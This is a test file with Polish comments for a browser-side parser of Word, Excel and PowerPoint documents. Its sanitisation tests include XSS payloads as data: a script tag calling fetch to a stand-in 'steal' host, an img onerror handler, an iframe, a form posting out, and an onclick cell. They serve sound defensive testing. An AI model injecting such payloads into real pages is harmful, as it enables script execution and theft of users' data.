// Parsowanie dokumentów biurowych po stronie przeglądarki.
//
// DLACZEGO PLIK NIGDY NIE OPUSZCZA SESJI. Kubełek jest prywatny, a Office
// Online i Google Docs viewer wymagają publicznie osiągalnego adresu - wysłanie
// tam podpisanego URL-a oznaczałoby oddanie materiału członkowskiego obcemu
// serwerowi. Cała ta warstwa istnieje po to, żeby tego nie robić, i do
// 18.08.2026 nie miała ani jednego wykonania.
//
// NAJWAŻNIEJSZA REGUŁA TEGO PLIKU TO SANITYZACJA. `parseDocx` i
// `parseSpreadsheet` oddają HTML, który komponent wstawia przez
// `dangerouslySetInnerHTML` - to JEDYNE miejsce, w którym dokument obcego
// autorstwa staje się DOM-em na naszej stronie. Dlatego DOMPurify jest tu
// PRAWDZIWY, nie zaatrapowany: atrapa dowiodłaby tylko, że wołamy funkcję
// o właściwej nazwie.
//
// Parsery (mammoth/xlsx/jszip) są atrapowane NA GRANICY MODUŁU, bo test ma
// sprawdzać nasz kod, a nie cudzy dekoder OOXML.
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const h = vi.hoisted(() => ({
  docx: { value: "<p>Treść</p>", messages: [] as Array<{ message: string }> },
  docxCalls: [] as Array<{ input: unknown; options: unknown }>,
  workbook: {
    SheetNames: ["Arkusz1"],
    Sheets: {} as Record<string, unknown>,
  },
  sheetHtml: "<table><tr><td>1</td></tr></table>",
  zipFiles: {} as Record<string, string>,
  zipBinary: {} as Record<string, string>,
}));

vi.mock("mammoth", () => ({
  convertToHtml: (input: unknown, options: unknown) => {
    h.docxCalls.push({ input, options });
    return Promise.resolve(h.docx);
  },
}));

vi.mock("xlsx", () => ({
  read: () => h.workbook,
  utils: {
    sheet_to_html: () => h.sheetHtml,
    decode_range: (ref: string) => {
      // Minimalny dekoder „A1:B7" -> ostatni wiersz 6 (0-indeksowany).
      const last = ref.split(":")[1] ?? "A1";
      return { e: { r: Number(last.replace(/[A-Z]/g, "")) - 1 } };
    },
  },
}));

vi.mock("jszip", () => ({
  default: {
    loadAsync: () =>
      Promise.resolve({
        files: Object.fromEntries(Object.keys(h.zipFiles).map((path) => [path, {}])),
        file: (path: string) => {
          if (h.zipFiles[path] === undefined) return null;
          return {
            async: (type: string) =>
              Promise.resolve(type === "blob" ? new Blob([h.zipFiles[path]!]) : h.zipFiles[path]!),
          };
        },
      }),
  },
}));

const { parseDocx, parsePptx, parseSpreadsheet } = await import("@/lib/files/officeParse");

const BUFFER = new ArrayBuffer(8);

beforeEach(() => {
  h.docx = { value: "<p>Treść</p>", messages: [] };
  h.docxCalls = [];
  h.workbook = { SheetNames: ["Arkusz1"], Sheets: { Arkusz1: { "!ref": "A1:B7" } } };
  h.sheetHtml = "<table><tr><td>1</td></tr></table>";
  h.zipFiles = {};
  h.zipBinary = {};
  vi.stubGlobal("URL", {
    ...URL,
    createObjectURL: () => "blob:mock/obraz",
    revokeObjectURL: () => {},
  });
});

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("parseDocx", () => {
  it("oddaje HTML dokumentu", async () => {
    await expect(parseDocx(BUFFER)).resolves.toMatchObject({ html: "<p>Treść</p>" });
  });

  it("przekazuje bufor i mapę stylów do dekodera", async () => {
    // Mapa stylów jest jedynym powodem, dla którego cytat blokowy z Worda
    // wygląda jak cytat, a nie jak zwykły akapit.
    await parseDocx(BUFFER);
    expect(h.docxCalls[0]?.input).toEqual({ arrayBuffer: BUFFER });
    expect(h.docxCalls[0]?.options).toEqual({
      styleMap: ["p[style-name='Quote'] => blockquote:fresh"],
    });
  });

  it("USUWA skrypt z dokumentu - to jedyne miejsce, gdzie obcy plik staje się DOM-em", async () => {
    h.docx = { value: '<p>ok</p><script>fetch("https://obcy/kradnij")</script>', messages: [] };
    const { html } = await parseDocx(BUFFER);
    expect(html).toContain("ok");
    expect(html).not.toContain("script");
    expect(html).not.toContain("obcy");
  });

  it.each([
    ['<img src="x" onerror="alert(1)">', "onerror"],
    ['<iframe src="https://obcy"></iframe>', "iframe"],
    ["<style>body{display:none}</style>", "style"],
    ['<object data="x"></object>', "object"],
    ['<embed src="x">', "embed"],
    ['<form action="https://obcy"><input name="p"></form>', "form"],
  ])("wycina %s", async (payload, forbidden) => {
    h.docx = { value: `<p>ok</p>${payload}`, messages: [] };
    const { html } = await parseDocx(BUFFER);
    expect(html).not.toContain(forbidden);
  });

  it("zachowuje zwykłe formatowanie tekstu", async () => {
    // Sanityzacja nie może zjeść dokumentu razem z zagrożeniem.
    h.docx = { value: "<h2>Nagłówek</h2><p><strong>Pogrubienie</strong></p>", messages: [] };
    const { html } = await parseDocx(BUFFER);
    expect(html).toContain("<h2>");
    expect(html).toContain("<strong>");
  });

  it("przenosi ostrzeżenia dekodera", async () => {
    h.docx = { value: "<p>x</p>", messages: [{ message: "Nieznany styl" }] };
    await expect(parseDocx(BUFFER)).resolves.toMatchObject({ warnings: ["Nieznany styl"] });
  });

  it("dokument bez ostrzeżeń ma pustą listę", async () => {
    await expect(parseDocx(BUFFER)).resolves.toMatchObject({ warnings: [] });
  });
});

describe("parseSpreadsheet", () => {
  it("oddaje arkusz z nazwą, treścią i liczbą wierszy", async () => {
    const [sheet] = await parseSpreadsheet(BUFFER);
    expect(sheet).toMatchObject({ name: "Arkusz1", rows: 7 });
    expect(sheet?.html).toContain("<table>");
  });

  it("liczy wiersze z zakresu arkusza, a nie ze znaczników HTML", async () => {
    h.workbook = { SheetNames: ["Dane"], Sheets: { Dane: { "!ref": "A1:C25" } } };
    const [sheet] = await parseSpreadsheet(BUFFER);
    expect(sheet?.rows).toBe(25);
  });

  it("arkusz BEZ zakresu ma zero wierszy, a nie NaN", async () => {
    h.workbook = { SheetNames: ["Pusty"], Sheets: { Pusty: {} } };
    const [sheet] = await parseSpreadsheet(BUFFER);
    expect(sheet?.rows).toBe(0);
  });

  it("nazwa arkusza bez odpowiadającego obiektu daje pusty arkusz, a nie wywrotkę", async () => {
    // Skoroszyt z ukrytym albo uszkodzonym arkuszem wymienia go w `SheetNames`,
    // ale nie ma go w `Sheets`. Bez tej gałęzi cały podgląd padał na undefined.
    h.workbook = { SheetNames: ["Widoczny", "Zepsuty"], Sheets: { Widoczny: { "!ref": "A1:A3" } } };
    const sheets = await parseSpreadsheet(BUFFER);
    expect(sheets).toHaveLength(2);
    expect(sheets[1]).toEqual({ name: "Zepsuty", html: "", rows: 0 });
  });

  it("oddaje wszystkie arkusze skoroszytu", async () => {
    h.workbook = {
      SheetNames: ["A", "B", "C"],
      Sheets: { A: { "!ref": "A1:A1" }, B: { "!ref": "A1:A2" }, C: { "!ref": "A1:A3" } },
    };
    expect((await parseSpreadsheet(BUFFER)).map((s) => s.name)).toEqual(["A", "B", "C"]);
  });

  it("skoroszyt bez arkuszy daje pustą listę", async () => {
    h.workbook = { SheetNames: [], Sheets: {} };
    await expect(parseSpreadsheet(BUFFER)).resolves.toEqual([]);
  });

  it("SANITYZUJE treść arkusza - komórka też potrafi nieść skrypt", async () => {
    h.sheetHtml = '<table><tr><td onclick="alert(1)">x</td></tr></table><script>bad()</script>';
    const [sheet] = await parseSpreadsheet(BUFFER);
    expect(sheet?.html).not.toContain("script");
    expect(sheet?.html).not.toContain("onclick");
  });
});

describe("parsePptx", () => {
  /** Slajd w minimalnym XML-u OOXML. */
  function slideXml(paragraphs: string[]): string {
    const body = paragraphs.map((line) => `<a:p><a:r><a:t>${line}</a:t></a:r></a:p>`).join("");
    return `<?xml version="1.0"?><p:sld xmlns:a="x" xmlns:p="y"><p:cSld><p:spTree>${body}</p:spTree></p:cSld></p:sld>`;
  }

  it("czyta tytuł i punkty slajdu", async () => {
    h.zipFiles = { "ppt/slides/slide1.xml": slideXml(["Tytuł slajdu", "Punkt A", "Punkt B"]) };
    const [slide] = await parsePptx(BUFFER);
    expect(slide?.title).toBe("Tytuł slajdu");
    expect(slide?.paragraphs).toEqual(["Punkt A", "Punkt B"]);
  });

  it("sortuje slajdy LICZBOWO, nie alfabetycznie", async () => {
    // Alfabetycznie „slide10" wypada przed „slide2" - prezentacja czytałaby
    // się w rozsypanej kolejności od dziesiątego slajdu wzwyż.
    h.zipFiles = {
      "ppt/slides/slide1.xml": slideXml(["Jeden"]),
      "ppt/slides/slide10.xml": slideXml(["Dziesięć"]),
      "ppt/slides/slide2.xml": slideXml(["Dwa"]),
    };
    const slides = await parsePptx(BUFFER);
    expect(slides.map((s) => s.index)).toEqual([1, 2, 10]);
    expect(slides.map((s) => s.title)).toEqual(["Jeden", "Dwa", "Dziesięć"]);
  });

  it("pomija pliki spoza katalogu slajdów", async () => {
    h.zipFiles = {
      "ppt/slides/slide1.xml": slideXml(["Slajd"]),
      "ppt/theme/theme1.xml": "<theme/>",
      "docProps/app.xml": "<props/>",
    };
    expect(await parsePptx(BUFFER)).toHaveLength(1);
  });

  it("slajd bez tekstu ma pusty tytuł i brak punktów", async () => {
    h.zipFiles = { "ppt/slides/slide1.xml": slideXml([]) };
    const [slide] = await parsePptx(BUFFER);
    expect(slide?.title).toBeNull();
    expect(slide?.paragraphs).toEqual([]);
  });

  it("scala białe znaki w akapicie", async () => {
    h.zipFiles = { "ppt/slides/slide1.xml": slideXml(["Tekst   z    odstępami"]) };
    const [slide] = await parsePptx(BUFFER);
    expect(slide?.title).toBe("Tekst z odstępami");
  });

  it("brak notatek daje null, a nie pusty napis", async () => {
    h.zipFiles = { "ppt/slides/slide1.xml": slideXml(["Slajd"]) };
    const [slide] = await parsePptx(BUFFER);
    expect(slide?.notes).toBeNull();
  });

  it("czyta notatki prelegenta z odpowiadającego slajdu", async () => {
    h.zipFiles = {
      "ppt/slides/slide1.xml": slideXml(["Slajd"]),
      "ppt/notesSlides/notesSlide1.xml":
        '<?xml version="1.0"?><root xmlns:a="x"><a:t>Notatka do slajdu</a:t></root>',
    };
    const [slide] = await parsePptx(BUFFER);
    expect(slide?.notes).toBe("Notatka do slajdu");
  });

  it("puste notatki czytają się jako brak notatek", async () => {
    h.zipFiles = {
      "ppt/slides/slide1.xml": slideXml(["Slajd"]),
      "ppt/notesSlides/notesSlide1.xml":
        '<?xml version="1.0"?><root xmlns:a="x"><a:t>   </a:t></root>',
    };
    const [slide] = await parsePptx(BUFFER);
    expect(slide?.notes).toBeNull();
  });

  it("slajd bez pliku relacji nie ma obrazów", async () => {
    h.zipFiles = { "ppt/slides/slide1.xml": slideXml(["Slajd"]) };
    const [slide] = await parsePptx(BUFFER);
    expect(slide?.images).toEqual([]);
  });

  /** Slajd z osadzonym obrazem (relacja `r:embed` wskazuje na wpis w .rels). */
  function slideWithImage(relId: string): string {
    return `<?xml version="1.0"?><p:sld xmlns:a="x" xmlns:p="y" xmlns:r="z"><p:cSld><p:spTree><a:blip r:embed="${relId}"/></p:spTree></p:cSld></p:sld>`;
  }

  function relsXml(entries: Array<{ id: string; target: string }>): string {
    const body = entries.map((e) => `<Relationship Id="${e.id}" Target="${e.target}"/>`).join("");
    return `<?xml version="1.0"?><Relationships>${body}</Relationships>`;
  }

  it("rozwiązuje obraz slajdu przez plik relacji", async () => {
    // PPTX nie trzyma adresu obrazu w slajdzie - trzyma identyfikator relacji.
    // Bez przejścia przez .rels slajd wyrenderowałby się bez ilustracji.
    h.zipFiles = {
      "ppt/slides/slide1.xml": slideWithImage("rId1"),
      "ppt/slides/_rels/slide1.xml.rels": relsXml([{ id: "rId1", target: "../media/image1.png" }]),
      "ppt/media/image1.png": "BINARY",
    };
    const [slide] = await parsePptx(BUFFER);
    expect(slide?.images).toEqual(["blob:mock/obraz"]);
  });

  it("relacja wskazująca na NIEISTNIEJĄCY plik jest pomijana", async () => {
    h.zipFiles = {
      "ppt/slides/slide1.xml": slideWithImage("rId1"),
      "ppt/slides/_rels/slide1.xml.rels": relsXml([{ id: "rId1", target: "../media/brak.png" }]),
    };
    const [slide] = await parsePptx(BUFFER);
    expect(slide?.images).toEqual([]);
  });

  it("obraz o NIEZNANYM identyfikatorze relacji jest pomijany", async () => {
    h.zipFiles = {
      "ppt/slides/slide1.xml": slideWithImage("rId999"),
      "ppt/slides/_rels/slide1.xml.rels": relsXml([{ id: "rId1", target: "../media/image1.png" }]),
      "ppt/media/image1.png": "BINARY",
    };
    const [slide] = await parsePptx(BUFFER);
    expect(slide?.images).toEqual([]);
  });

  it("wpis relacji bez identyfikatora albo bez celu nie trafia do mapy", async () => {
    h.zipFiles = {
      "ppt/slides/slide1.xml": slideWithImage("rId1"),
      "ppt/slides/_rels/slide1.xml.rels":
        '<?xml version="1.0"?><Relationships><Relationship Target="../media/image1.png"/></Relationships>',
      "ppt/media/image1.png": "BINARY",
    };
    const [slide] = await parsePptx(BUFFER);
    expect(slide?.images).toEqual([]);
  });

  it("cel spoza katalogu nadrzędnego zostaje bez przepisania ścieżki", async () => {
    // Target bywa podany względem katalogu prezentacji (bez „../"), wtedy
    // ścieżka w archiwum jest już poprawna i nie wolno jej ruszać.
    h.zipFiles = {
      "ppt/slides/slide1.xml": slideWithImage("rId1"),
      "ppt/slides/_rels/slide1.xml.rels": relsXml([{ id: "rId1", target: "ppt/media/inline.png" }]),
      "ppt/media/inline.png": "BINARY",
    };
    const [slide] = await parsePptx(BUFFER);
    expect(slide?.images).toEqual(["blob:mock/obraz"]);
  });

  it("prezentacja bez slajdów daje pustą listę", async () => {
    h.zipFiles = { "docProps/app.xml": "<props/>" };
    await expect(parsePptx(BUFFER)).resolves.toEqual([]);
  });
});
